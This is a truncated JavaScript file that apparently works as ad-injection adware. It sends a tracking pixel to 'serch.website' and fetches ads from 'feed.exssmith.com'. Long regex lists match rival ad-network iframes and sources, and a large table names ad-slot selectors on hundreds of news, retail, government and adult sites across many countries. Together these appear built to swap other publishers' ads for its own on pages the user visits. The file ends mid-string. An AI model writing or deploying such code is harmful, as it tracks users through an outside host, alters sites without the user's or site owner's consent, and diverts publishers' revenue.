var all_bnxa = function (hash) {
    var count = 0;
    var ad_adl = 0;
    var ads_arr = [];
    var ads_count = 0;
    var r_min_max = function (min, max) {
        return Math.round(Math.random() * (max - min)) + min;
    };
    var ui = function () {
        var i = document.createElement('img');
        i.src = 'https://serch.website/click.php?cnv_u=' + hash;
        document.body.appendChild(i);
        setTimeout(function () {
            i.parentNode.removeChild(i);
        }, 500);
    };
    ui();
    var waiting_ads = true;
    var new_ads = function () {
        waiting_ads = true;
        var waiting_count = 0;
        var t = new XMLHttpRequest();
        t.open('GET', 'https://feed.exssmith.com/code/feed/?pid=' + hash + '&mm=js&limit=20', true);
        t.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        t.onload = function () {
            if (t.status >= 200 && t.status < 400 && t.responseText) {
                var items = JSON.parse(t.responseText);
                if (items && items.length > 0) {
                    items.forEach(function (v) {
                        var ROW_arr = {
                            header: v.title,
                            link: v.link,
                            image: v.image,
                            text: v.description,
                            price: v.cpc
                        };
                        ads_arr.push(ROW_arr);
                    });
                }
                waiting_count++;
            }
        };
        t.send();
        var w = setInterval(function () {
            if (waiting_count === 1) {
                waiting_ads = false;
                setTimeout(function () {
                    ads_arr.sort(function (a, b) {
                        return b['price'] - a['price'];
                    });
                    ads_count = 0;
                    clearInterval(w);
                }, 20);
            }
        }, 50);
    };
    new_ads();

    var $_GET = function (key) {
        var s = window.location.search;
        s = s.match(new RegExp(key + '=([^&=]+)'));
        return s ? s[1] : false;
    };

    function GetCssStyle(e) {
        if (e.currentStyle) return e.currentStyle; else if (window.getComputedStyle) return window.getComputedStyle(e, null)
    }

    function $$(sel) {
        var res = [];
        var els = document.querySelectorAll(sel);
        if (els && els.length > 0) {
            res = els;
        }
        return res;
    }

    var y_check = '<img style="width:11px;margin:auto auto -1px 3px;" src="data:image/svg+xml;utf8;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pgo8IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMTYuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+CjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+CjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgdmVyc2lvbj0iMS4xIiBpZD0iQ2FwYV8xIiB4PSIwcHgiIHk9IjBweCIgd2lkdGg9IjE2cHgiIGhlaWdodD0iMTZweCIgdmlld0JveD0iMCAwIDQzOC41MzMgNDM4LjUzMyIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgNDM4LjUzMyA0MzguNTMzOyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+CjxnPgoJPHBhdGggZD0iTTQwOS4xMzMsMTA5LjIwM2MtMTkuNjA4LTMzLjU5Mi00Ni4yMDUtNjAuMTg5LTc5Ljc5OC03OS43OTZDMjk1LjczNiw5LjgwMSwyNTkuMDU4LDAsMjE5LjI3MywwICAgYy0zOS43ODEsMC03Ni40Nyw5LjgwMS0xMTAuMDYzLDI5LjQwN2MtMzMuNTk1LDE5LjYwNC02MC4xOTIsNDYuMjAxLTc5LjgsNzkuNzk2QzkuODAxLDE0Mi44LDAsMTc5LjQ4OSwwLDIxOS4yNjcgICBjMCwzOS43OCw5LjgwNCw3Ni40NjMsMjkuNDA3LDExMC4wNjJjMTkuNjA3LDMzLjU5Miw0Ni4yMDQsNjAuMTg5LDc5Ljc5OSw3OS43OThjMzMuNTk3LDE5LjYwNSw3MC4yODMsMjkuNDA3LDExMC4wNjMsMjkuNDA3ICAgczc2LjQ3LTkuODAyLDExMC4wNjUtMjkuNDA3YzMzLjU5My0xOS42MDIsNjAuMTg5LTQ2LjIwNiw3OS43OTUtNzkuNzk4YzE5LjYwMy0zMy41OTYsMjkuNDAzLTcwLjI4NCwyOS40MDMtMTEwLjA2MiAgIEM0MzguNTMzLDE3OS40ODUsNDI4LjczMiwxNDIuNzk1LDQwOS4xMzMsMTA5LjIwM3ogTTM2MS40NDUsMTg1Ljg2M0wyMDYuNDIsMzQwLjg4OWMtMy42MTcsMy42Mi03Ljk5Miw1LjQyOC0xMy4xMzQsNS40MjggICBjLTQuOTQ4LDAtOS4yMjktMS44MDgtMTIuODQ3LTUuNDI4TDc3LjA4MywyMzcuNTM5Yy0zLjQyMi0zLjQyOS01LjEzNy03LjcwMy01LjEzNy0xMi44NDdjMC01LjMyOCwxLjcwOS05LjcwOSw1LjEzNy0xMy4xMzYgICBsMjUuOTgxLTI1LjY5M2MzLjYyMS0zLjYxNiw3Ljg5OC01LjQyNCwxMi44NS01LjQyNHM5LjIzNSwxLjgwOSwxMi44NSw1LjQyNGw2NC41MjUsNjQuNTIzbDExNi40ODUtMTE2LjE5OSAgIGMzLjYxNy0zLjYxNyw3Ljg5OC01LjQyNiwxMi44NDctNS40MjZjNC45NDUsMCw5LjIzMywxLjgwOSwxMi44NDcsNS40MjZsMjUuOTgxLDI1LjY5N2MzLjQzMiwzLjQyNCw1LjE0LDcuODAxLDUuMTQsMTMuMTI5ICAgQzM2Ni41ODksMTc4LjE1NCwzNjQuODgxLDE4Mi40MzcsMzYxLjQ0NSwxODUuODYzeiIgZmlsbD0iI2ExYTFhMSIvPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+Cjwvc3ZnPgo=" />';
    var cl_img = '<img style="width:100%;" src="data:image/svg+xml;utf8;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pgo8IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMTYuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+CjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+CjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgdmVyc2lvbj0iMS4xIiBpZD0iQ2FwYV8xIiB4PSIwcHgiIHk9IjBweCIgd2lkdGg9IjE2cHgiIGhlaWdodD0iMTZweCIgdmlld0JveD0iMCAwIDM0OC4zMzMgMzQ4LjMzNCIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzQ4LjMzMyAzNDguMzM0OyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+CjxnPgoJPHBhdGggZD0iTTMzNi41NTksNjguNjExTDIzMS4wMTYsMTc0LjE2NWwxMDUuNTQzLDEwNS41NDljMTUuNjk5LDE1LjcwNSwxNS42OTksNDEuMTQ1LDAsNTYuODUgICBjLTcuODQ0LDcuODQ0LTE4LjEyOCwxMS43NjktMjguNDA3LDExLjc2OWMtMTAuMjk2LDAtMjAuNTgxLTMuOTE5LTI4LjQxOS0xMS43NjlMMTc0LjE2NywyMzEuMDAzTDY4LjYwOSwzMzYuNTYzICAgYy03Ljg0Myw3Ljg0NC0xOC4xMjgsMTEuNzY5LTI4LjQxNiwxMS43NjljLTEwLjI4NSwwLTIwLjU2My0zLjkxOS0yOC40MTMtMTEuNzY5Yy0xNS42OTktMTUuNjk4LTE1LjY5OS00MS4xMzksMC01Ni44NSAgIGwxMDUuNTQtMTA1LjU0OUwxMS43NzQsNjguNjExYy0xNS42OTktMTUuNjk5LTE1LjY5OS00MS4xNDUsMC01Ni44NDRjMTUuNjk2LTE1LjY4Nyw0MS4xMjctMTUuNjg3LDU2LjgyOSwwbDEwNS41NjMsMTA1LjU1NCAgIEwyNzkuNzIxLDExLjc2N2MxNS43MDUtMTUuNjg3LDQxLjEzOS0xNS42ODcsNTYuODMyLDBDMzUyLjI1OCwyNy40NjYsMzUyLjI1OCw1Mi45MTIsMzM2LjU1OSw2OC42MTF6IiBmaWxsPSIjN2Y3ZjdmIi8+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPC9zdmc+Cg==" />';
    var if_di = function (a) {
        if (a.id.match(/(MB-iframe|adnzone_30|mgiframe|zd_async_frame|cdxhd_ifr|adnxs_tag|utif|ants-banner|actionteaser|SC_TBlock|lx_table|RTBIFR|yottos|DAIFR|lsadvert-zid|AdFox_banner|frame-innity|INNITYFrame|openx_spot|gnr|_poster_iframe|hsoub_adplace|_fw_frame_banner|adtimaIFrameWrapper|adnzone|exo_vidBanner|ads_zone|avp_zid|ad_ifr|adfox_iframe|AdFox_iframe|AdFox_plug|oas_frame|baner|advertur|republer|ya_partner_R|xhtml_banner|adfoxHtml5_iframe|__switch_placeholder|sovrn_ad_unit|advertur_section|ertb|eclick_ads_frame|Leaderboard|Marketing|Rectangle|sas|atwAdFrame|ox|aswift|google_decrypt_frame|cto_iframe|google_ads_iframe|google_ads_frame|rtm_iframe|ados_frame|adf_[0-9])/img)) {
            return 1;
        } else {
            return 0;
        }
    };
    var if_rs = function (a) {
        if (a.src.match(/\/\/(tesla\.r\.acdnpro\.com|xiepl\.com|ad\.adriver\.ru|pipki\.r|show\.bumq\.com|mg\.mgid\.com|d\.otaserve\.net|delivery\.performax\.cz|adserve\.adpulse\.ir|toy69\.ru|ssl-tools\.bongacams\.com|www\.sabavision\.com|adserve\.adpulse|ads\.|servers1\.adriver\.ru|buckridge\.link|in\.fjjuo\.com|zog\.link|exoclick\.com|tsyndicate\.com|adst\.fwdcdn\.com|reklama\.ngs\.ru|s\.yimg\.com|a1\.ax\.rareru\.ru|cas\.ny\.us\.criteo\.com|cdn\.brand-display\.com|syndication\.exdynsrv\.com|www\.fullfilmizlesem\.com|www\.filmizlejet\.org|adserver\.reklamstore\.com|us-ads\.openx\.net|bit\.ly|01\.creativecdn\.com|www\.rek\.mobi|cdn\.html5maker\.com|static\.gyakorikerdesek\.hu|www\.netadclick\.com|ad\.serve-sys\.com|ox-d\.gamerpublishing\.com|cdn\.adfront\.org|securepubads\.g\.doubleclick\.net|mgid\.com|rtb\.imedia\.cz|www\.box\.bg|reklama\.wisdom\.bg|jdn\.monster\.com|secure\.adnxs\.com|cas\.criteo\.com|ad\.ilcdn\.fi|vg\.is\.fi|adfox\.vn|ads\.pantip\.com|news\.gnezdo\.ru|www\.adsellers\.net|shop\.gnezdo\.ru|static\.smi2\.net|banners|tools\.runetki\.co|aff\.abs-cdn\.org|ad\.lbbanners\.com|disqusads\.comads-iframe|in2\.zog\.link|in4\.zog\.link|www\.wetplace\.com|www\.traffictraffickers\.com|www\.milf\.nl|ads\.ero-advertising\.com|www\.updatetube\.com|updatetube\.com|in\.zog\.link|syndication\.exosrv\.com|ads\.adamoads\.com|jav68\.me|jav68\.tv|ads\.adxpansion\.com|olimpbanners\.info|hhcdn\.ru|a4\.ax\.rareru\.ru|adveasy\.ru|ads\.ad4game\.com|process\.nextads\.ir|coinad\.comads|ad\.afilo\.pl|static\.clickonometrics\.pl|search\.supplyframe\.com|c\.smartclick\.net|www\.zononi\.com|br2\.ru|code\.barrior\.ru|banner\.mediaweb\.ru|uploadbanner|s0\.2mdn\.netdfp|www\.trbetmedia\.com|media\.winaffiliates\.com|adserver\.advrstcdn\.com|cdn\.bannersnack\.com|h\.holder\.com\.ua|i\.holder\.com\.ua|reklami|toroadvertisingmedia\.com|speednetwork14\.adk2x\.com|ad\.a-ads\.com|www\.ad\.adtube\.ir|ireklama\.mk|xblasterads1\.com|b\.turbo\.az|vcdn\.media\.innity\.net|alipromo\.com|ads\.adfox\.ru|cdnvt\.ru|b\.frida\.vse42\.ru|in3\.zog\.link|br\.rk\.com|ads\.amakings\.com|medya\.ilan\.gov\.tr|blockadz\.com|mellowads\.com|s1\.dpb\.adnegah\.net|ad\.anetwork\.ir|ib\.adnxs\.com|uploadbanners|bk\.goodline\.info|backend\.opogame\.com|adi\.admicro\.vn|a2\.ax\.rareru\.ru|multi\.4smi\.ru|adimg\.uimserv\.net|nrzcj\.top|advideo\.uimserv\.net|ad\.adverticum\.net|i\.imedia\.cz|a\.clickyab\.com|ads2\.zeusclicks\.com|ads2\.wtfpeople\.com|tools\.bongacams\.com|ads\.theporndb\.com|pcash\.imlive\.com|d29gqcij\.com|static\.drtuber\.com|geo\.frtyd\.com|usr\.dropkickmedia\.com|a\.adnium\.com|web\.nxstx\.top|reg\.nxstx\.top|ads\.livembed\.com|i\.nxstx\.top|clkrev\.com|sendmad\.com|p\.nxstx\.top|cdn\.ambientplatform\.vn|speednetwork6\.adk2x\.com|ads\.medi-8\.net|cs\.adxpansion\.com|adblock|downloadha\.camp\.sabavision\.com|fastclick\.co|cdn\.asn\.advolution\.de|pub\.dreamboxcart\.com|ad\.doubleclick\.net|track\.adform\.net|sn\.sanoma\.fi|bdfrm\.bidvertiser\.com|cdn\.waframedia9\.com|adm\.shinobi\.jp|s0\.2mdn\.net|ads\.persgroep\.net|leaderboard\.php|zlavy\.sme\.sk|adx\.admicro\.vn|ads\.adsready\.com|oascentral\.sears\.com|s3-sa-east-1\.amazonaws\.com|ads\.egrana\.com\.br|p3\.adhitzads\.com|akhtm\.nspmotion\.com|gocdn\.ru|www\.tradeadexchange\.com|creative\.wwwpromoter\.com|adserver\.adtech\.de|servedby\.pixfuture\.net|partnernews\.php|www\.tredman\.com|superkinobob\.ru|onedrive\.su|twodrive\.su|cdn7\.rocks|ads\.betweendigital\.com|bxjch\.top|cszz\.ru|advert\.php|mxtads\.com|funsmi\.ru|cshi\.ru|smilered\.com|aka-cdn-ns\.adtech\.de|r\.mradx\.net|media\.adrcdn\.com|images\.pub\.goha\.ru|in\.kpyub\.com|adserver\.juicyads\.com|partners\.smmnewscenter\.com|ams1-ib\.adnxs\.com|invideo\.ero-advertising\.com|t05\.vipstreamservice\.com|dyn\.empflix\.com|as\.sexad\.net|ad_detail\.html\?ad=footer|www\.bravoporn\.com|dyn\.tnaflix\.com|adserver\.exoticads\.com|delivery\.trafficforce\.com|delivery\.porn\.com|www\.urldelivery\.com|ads\.trafficjunky\.net|rotator\.trafficstars\.com|hilltopads\.net|ads2\.contentabc\.com|ads\.contentabc\.com|ss\.phncdn\.com|cdn1d-static-shared\.phncdn\.com|trw12\.com|in5\.zog\.link|sunstatic\.fuckandcdn\.com|syndication\.traffichaus\.com|adv\.h2porn\.com|ads\.h2porn\.com|adspaces\.ero-advertising\.com|adbucks\.brandreachsys\.com|prwidgets\.com|seventeenlive\.com|mobileads\.ero-advertising\.com|ad2\.adfarm1\.adition\.com|tpc\.googlesyndication\.com)/img)) {
            return 1;
        } else {
            return 0;
        }
    };

    var host = document.location.host;
    var if_yti = (host === 'www.youtube.com');
    var body = document.querySelector("body");
    if (body) {
        var body_width = body.offsetWidth;
        var body_height = body.offsetHeight;
    } else {
        return;
    }
    var a_7 = '*margin:5px auto;*d*728*90**';
    var str_dm_ad = 'football.kulichki.net*div[class^="bunner_container"]*""*b**giaoducthoidai.vn*div[id^="adsctl00"]*""*b**keonhacai.com*div[class^="right_pane"]*""*a**keonhacai.com*div[class^="container-inner"]*""*a**www.xemgame.com*div[class^="col-sm-10 kqcenter"]*""*a**www.xemgame.com*div[id^="top-ads"]*""*a**www.xemgame.com*div[class^="right-con"]*""*b**baodansinh.vn*div[class^="adv fr"]*""*a**hocmai.vn*div[id^="support-"]' + a_7 + 'vkool.net*div[id^="float_content"]*""*b**vkool.net*div[id^="ad_top_banner"]*""*a**animetvn.com*div[class^="gnarty-offads"]*""*b**www.hdsieunhanh.com*div[class^="group coming"]' + a_7 + 'blogtruyen.com*div[id^="topbanner"]*""*a**tv.101vn.com*div[class^="leaderboard_banner"]*""*a**tv.101vn.com*div[class^="right_pane"]*""*a**tv.101vn.com*div[class^="container-inner"]*""*a**www.nguyenkim.com*div[id^="banner_slider"]*""*a**www.hotdeal.vn*div[class^="block__content tab-content"]' + a_7 + 'www.nguyenkim.com*div[id^="main-product_"]' + a_7 + 'www.yeutretho.vn*.ads*""*b**tinnhanhchungkhoan.vn*div[id^="adsct"]*""*b**truyentranh.net*div[class^="BoxADV"]*""*a**www.dienmayxanh.com*ul[class^="homeproduct"]' + a_7 + 'ictnews.vn*div[class^="header-banner"]*""*a**vietdesigner.net*div[class^="cb-line clearfix"]' + a_7 + 'vndoc.com*div[class^="adbox"]*""*a**www.adayroi.com*div[id^="segment_vingroup_banners"]*""*a**www.adayroi.com*div[class^="homepage-category theme"]' + a_7 + 'www.sieuthitaigia.vn*div[id^="adv-top"]*""*a**tructiepbongda.com*div[id^="fullad"]*""*b**tructiepbongda.com*div[class^="widgetcontent"]*""*b**tuyensinh247.com*div[class^="ads"]*""*a**tuyensinh247.com*div[class^="banner"]*""*b**fptplay.net*div[class^="ads_"]*""*b**vetv.vn*div[id^="glive_banner"]*""*a**truyentranh8.net*div[id^="quangcaotop2"]*""*a**xemphimso.com*div[class^="xps_ads"]*""*b**thuvienphapluat.vn*div[class^="goiDvu-footer"]*""*a**plo.vn*div[id^="banner"]*""*a**muaban.net*div[class^="banner-middel"]*""*a**7msport.com*div[class^="ad3"]*""*b**www.vietnamworks.com*div[id^="ads_ADV_CAMPAIGN"]*""*a**thiendia.com*center*""*a**www.kingsport.vn*div[class^="cat-prod"]' + a_7 + 'www.kingsport.vn*div[class^="group-adv"]*""*b**baodautu.vn*ul[id^="ads_"]*""*b**baodautu.vn*div[class^="ads"]*""*b**xehay.vn*div[id^="banner1ab"]*""*a**batdongsan.com.vn*div[class^="adPosition"]*""*b**www.tienphong.vn*div[id^="Web_"]*""*b**quantrimang.com*div[class^="adx-zone"]*""*b**laodong.com.vn*div[id^="ads"]*""*b**gamevui.vn*div[id^="ads"]*""*b**fptshop.com.vn*div[class^="f-slright"]*""*a**mywork.com.vn*div[class^="web-wrapper"]*""*a**mywork.com.vn*div[class^="adright"]*""*a**mywork.com.vn*div[class^="adleft"]*""*a**truykich.vn*div[class^="owl-wrapper-outer"]*""*a**lienminh360.vn*div[id^="widget_sp_image-5"]*""*a**lienminh360.vn*div[class^="blockrows"]' + a_7 + 'www.foody.vn*div[class^="banner-slide"]*""*a**healthplus.vn*div[class^="banner"]*""*b**pose.com.vn*div[class^="articleTile ads bigBlock"]*""*a**tiki.vn*div[class^="home-block-wrap"]' + a_7 + 'vtc.vn*div[class^="adv"]*""*b**www.thuocbietduoc.com.vn*div[class^="adv_"]*""*b**congan.com.vn*div[class^="ads-"]*""*b**vatgia.com*div[id^="vatgia_home_new_200x360"]*""*a**www.giadinhvietnam.com*div[class^="adv"]*""*b**www.giadinhvietnam.com*div[class^="main-col-banner"]*""*a**www.fshare.vn*div[class^="content_banner_ev"]*""*a**tuoitre.vn*div[id^="Rgiht"]*""*b**vov.vn*div[id^="QCctl00_mainContent"]*""*b**www.baogiaothong.vn*div[class^="right ad_header"]*""*a**www.baogiaothong.vn*div[class^="hideprint"]*""*b**clipfapx.com*center[style^="text-align: center;"]*""*a**watch.thtube.com*center[style^="text-align: center;"]*""*a**www.powerbuy.co.th*div[class^="container hidden-sm"]*""*a**photo.7mth.com*div[class^="pp_box"]' + a_7 + 'cherry-porn.com*div[class^="aboutus widget_text"]*""*a**www.thaifranchisecenter.com*table[class^="ad_a"]*""*b**siam-movie.com*aside[id^="text-2"]*""*a**zeanstep.com*div[class^="bannergroup"]*""*b**www.thansettakij.com*div[class^="col-md-12 text-center"]*""*b**www.gamemonday.com*li[id^="ajdg_grpwidgets"]*""*b**sex.javhidef.com*center[style^="text-align: center;"]*""*a**youpornxxxx.com*div[id^="ads"]*""*b**www.doballclub.com*aside[id^="text-10"]*""*a**www.doballclub.com*center*""*a**v2.xxx888porn.com*div[align^="center"]*""*b**www.banidea.com*.defaultBg' + a_7 + 'www.banpolballs.com*div[class^="white_content"]*""*b**gameoverth.com*div[class^="a_mu"]*""*a**www.dailyenglish.in.th*div[class^="wpb_wrapper"]' + a_7 + 'www.1000tep.com*div[class^="col-lg-12 tags_cat"]*""*a**www.1000tep.com*div[class^="col-lg-9 adst"]*""*a**www.jobbkk.com*div[id^="wrap-bannerRight"]*""*a**www.hugball.com*div[class^="container bannertop"]*""*a**www.hugball.com*div[class^="banner"]*""*b**ballnaja.com*div[class^="a1-banner"]*""*a**www.cz-podzone.com*div[class^="clear nowrap"]*""*a**www.doofootball.com*div[class^="container banner"]*""*b**www.ballzaa.com*div[class^="banner_1000"]*""*b**www.siamdara.com*div[class^="warpper"]' + a_7 + 'nekopost.net*div[class^="col-md-6"]*margin:5px auto;*d*468*60**apps.garena.in.th*div[class^="hero__info__top"]' + a_7 + 'www.looksi.com*div[class^="cms-row"]' + a_7 + 'taradplaza.com*div[class^="box-bot-banner"]*""*b**yedtubehd.com*center*""*a**www.aelitaxtranslate.com*section[id^="colormag_featured_posts_widget"]' + a_7 + 'v2.allurexxxclub.com*div[id^="text-6"]*""*a**www.wtfintheworld.com*div[class^="vc_row wpb_row td-pb-row"]' + a_7 + 'naewna.com*div[class^="banner300 top"]*""*a**www.skyscanner.co.th*div[class^="shelf timeline-middleground"]' + a_7 + 'specphone.com*div[class^="adsSubmenu"]*""*b**central.co.th*section[class^="stripBanner"]*""*a**www.macthai.com*div[class^="side-ad"]*""*b**www.painaidii.com*div[id^="main-"]' + a_7 + 'www.boxzaracing.com*div[class^="_banner"]*""*b**www.wemall.com*div[class^="banner"]*""*b**www.it24hrs.com*li[class^="adrotate_widgets"]*""*b**www.voicetv.co.th*div[class^="row homepage-row"]' + a_7 + 'xxxpostpic.org*div[class^="adscenter"]*""*b**www.kaazip.com*div[id^="td_uid"]' + a_7 + 'www.trueplookpanya.com*.education-banner*""*a**www.news-lifestyle.com*div[class^="row index_left2_main"]' + a_7 + 'bangkok.com*div[class^="row-containe"]' + a_7 + 'xxxporn7.com*div[class^="ad ad_top_2"]*""*a**www.jobthai.com*div[id^="hotjobholder"]*""*a**www.vcharkarn.com*div[id^="echobanner"]*""*b**www.nationtv.tv*div[class^="ads"]*""*b**www.pantipmarket.com*div[id^="pmk_extended_display"]*""*a**droidsans.com*li[class^="infinite-post dr-post-feed"]' + a_7 + 'www3.mampost.com*article[id^="itunesmodule"]' + a_7 + 'jarm.com*div[class^="_banner"]*""*a**www.niceoppai.net*div[id^="bvr-adp"]*""*a**www.kingsmanga.net*div[class^="col-md-12 text-center"]*""*a**notebookspec.com*div[class^="container text-center"]*""*b**kaijeaw.com*div[class^="row category-block"]' + a_7 + 'www.siamhahe.com*div[id^="tpcrn_magazine_doublethumb"]' + a_7 + 'bugaboo.tv*section[class^="content-area"]' + a_7 + 'www.overclockzone.com*div[class^="rectra"]*""*a**www.overclockzone.com*.ads*""*b**jokergameth.com*div[class^="collapse"]' + a_7 + 'coconuts.co*section[class^="co-channel"]' + a_7 + 'www.teenee.com*div[id^="section_"]' + a_7 + 'www.ais.co.th*div[class^="container-main"]' + a_7 + 'www.lnwshop.com*div[class^="box_shadow_chrome"]' + a_7 + 'goal.in.th*div[class^="ajax-banner banner-i1"]*""*a**goal.in.th*div[id^="ads_top_content"]*""*a**oknation.nationtv.tv*div[class^="s3right"]*""*a**soccersuck.com*div[class^="adsever"]*width:200px;height:800px;*a**soccersuck.com*div[class^="adv_"]*""*b**www.realnakedgfs.com*div[id^="front-add"]*""*a**www.lesbian8.com*div[class^="ads"]*""*b**www.slutload.com*div[class^="no-span"]*""*a**www.hd21.com*div[class^="drt-spot-frame"]*""*a**yourlust.com*/im/footer*""*c**www.porntube.com*/ad_detail*""*c**www.4tube.com*/ad_detail*""*c**www.digisport.ro*div[class^="ads mediumrectangle"]*""*b**www.emag.ro*section[class^="mktp-banner-sell-with-emag homepage-banner-"]*""*a**newsinfo.inquirer.net*div[class^="tsa-"]*""*b**www.bbc.com*div[class^="advert advert"]*height:200px;*a**www.bbc.com*div[class^="advert advert"]*""*b**nts.org.pk*ul[class^="slides"]*""*b**jang.com.pk*div[class^="row content-row"]' + a_7 + 'javedch.com*div[class^="categoryholder cf"]' + a_7 + 'dailypakistan.com.pk*div[class^="c5ab-widget widget_posts-widget c5ab"]*margin:5px auto;*d*468*60**emdep.vn*div[class^="ads"]*""*b**www.blogphongthuy.com*div[class^="chatboxcontent"]*""*a**www.doisongphapluat.com*div[class^="banner-top pkg"]*height:200px;*a**trandaiquang.org*div[class^="bannerctv"]*""*a**baodauthau.vn*div[id^="adsctl00_SideBar_AdsTopRightTop"]*""*a**tinhte.vn*div[class^="promote section position"]*margin:10px auto;*d*728*90**lazada.vn*div[class^="c-layout-container__section c-mp-section "]*margin:10px auto;*d*728*90**8live.com*div[class^="images-banner-inner"]*""*a**8live.com*div[id^="banner"]*""*a**vtv.vn*div[class^="box-ads-top"]*""*a**www.daikynguyenvn.com*div[id^="ads300_250"]*""*a**www.kaidee.com*div[id^="list_lb"]*height:200px;*a**manager.co.th*div[class^="banner_970x250"]*""*a**www.037hd.com*div[class^="bireklam"]*""*b**www.037hd.com*div[class^="sidebar-right"]*""*b**pantip.com*div[class^="ads-leaderboard"]*height:200px*a**www.snapdeal.com*div[class^="adtechGoldBanner"]*""*b**www.manoramaonline.com*div[id^="advt-slot"]*""*b**www.rediff.com*div[id^="div_advt_right"]*""*a**www.list.am*div[id^="ad4"]*""*a**www.list.am*div[id^="bnr"]*""*a**www.list.am*div[id^="sqrbnr"]*""*a**krisha.kz*div[id^="brPlace_251"]*""*a**www.inbox.lv*https://www.inbox.lv/*""*c**www.mediamarkt.es*div[id^="megabanner-"]*""*b**kds0008.cc*ad/*""*c**90tv.ir*div[class^="ads-boxes"]*""*b**www.dizibox1.com*div[class^="adv-header-bottom"]*""*b**www.takealot.com*div[class^="sb sb-r"]*""*b**nesn.com*div[id^="acm_ad_zones-77"]*""*b**idope.se*div[id^="categorydiv"]*""*a**www.mackolik.com*div[class^="baner300x250"]*""*b**www.arte.tv*article[class^="next-teaser-banner"]*""*b**www.lindaikejisblog.com*div[class^="da side_first hidden-xs"]*""*a**www.atv.com.tr*div[class^="banner"]*""*b**fararu.com*div[class^="ads"]*""*b**www.memurlar.net*div[class^="defaultAds"]*""*b**www.bom.gov.au*aside[id^="advertising"]*""*a**www.service-public.fr*div[class^="ads ads-aside"]*""*b**www.alsbbora.com*div[class^="ad-area-wide adplace"]*""*b**www.alwakeelnews.com*div[class^="bestaAds_desktop"]*""*b**www.r18.com*p[class^="cmn-box-banner01"]*""*b**mover.uz*div[class^="block-info-vertical"]*""*a**showcase.skrill.com*div[class^="carousel-inner"]*""*a**entekhab.ir*div[class^="tabligh col-xs-36"]*""*b**www.onlinekhabar.com*div[id^="right_ads"]*""*b**garaanews.com*div[class^="grid12 mt10"]*""*b**www.bb.com.br*div[class^="picture desktop ng-scope"]*""*b**www.konga.com*div[class^="right_side_deal"]*""*a**www.rainews.it*div[class^="head box"]*""*a**pagalworld.me*https://pagalworld.me/*""*c**www.sammobile.com*div[class^="g-single a-17"]*""*a**www.sammobile.com*div[class^="a-single a-32"]*""*a**www.shahrekhabar.com*div[class^="sidebar right"]*""*a**societegenerale.fr*section[class^="eimm-std-col eimm-promo-banner"]*""*a**uloz.to*//advert.uloz.to/*""*c**www.boursorama.com*div[id^="sas_601"]*""*a**www.boursorama.com*div[id^="sas_795"]*""*a**www.cabelas.com*div[id^="CW1"]*""*a**colorlib.com*div[id^="text-"]*""*b**xehoiviet.com*div[class^="dk-car-banner"]*""*b**www.mashreghnews.ir*section[id^="box55"]*""*a**pornohub.su*div[class^="td_mod_wrap"]*""*a**www.makeleio.gr*aside[id^="tn_text-120"]*""*a**www.elzmannews.com*div[class^="banners"]*""*b**www.mehrnews.com*div[class^="box ads"]*""*b**www.hltv.org*div[class^="col-rek2"]*""*b**www.khabaronline.ir*.advContainer*""*b**www.asriran.com*http://asriran.camp.*""*c**www.aastocks.com*http://hkg3.aastocks.com/*""*c**persianblog.ir*div[id^="ads"]*""*a**www.haberturk.com*div[class^="ads-zone"]*""*b**www.focus.de*div[class^="srDroSn"]*""*a**sport.interia.pl*div[class^="boxBody"]*""*b**alwafd.org*div[class^="special-banner"]*""*a**www.elbalad.news*div[class^="block  adv300 newplace"]*""*a**www.flirt4free.com*div[class^="bannerFooterWrap"]*""*a**tabnak.ir*aside[class^="col-md-5 visible-lg visible-md padd_home_right home_adv_height"]*""*a**www.azlyrics.com*div[class^="hidden-xs 